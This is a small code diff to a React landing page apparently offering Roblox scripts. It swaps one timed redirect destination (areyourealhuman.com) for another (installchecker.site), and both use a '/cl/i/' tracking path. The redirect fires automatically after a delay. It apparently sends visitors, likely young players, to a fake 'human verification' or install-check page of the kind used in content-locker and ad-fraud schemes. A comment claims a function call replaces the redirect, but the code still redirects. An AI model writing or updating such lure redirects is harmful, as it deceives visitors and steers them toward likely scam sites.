@@ -84,7 +84,7 @@ export default function RobloxScriptsLanding() {
 
       // Call og_load function instead of redirecting
      setTimeout(() => {
-        window.location.href = "https://areyourealhuman.com/cl/i/2ljkdp"
+        window.location.href = "https://installchecker.site/cl/i/2ljkdp"
       }, 1000)
     }, 1000)
   }, [])
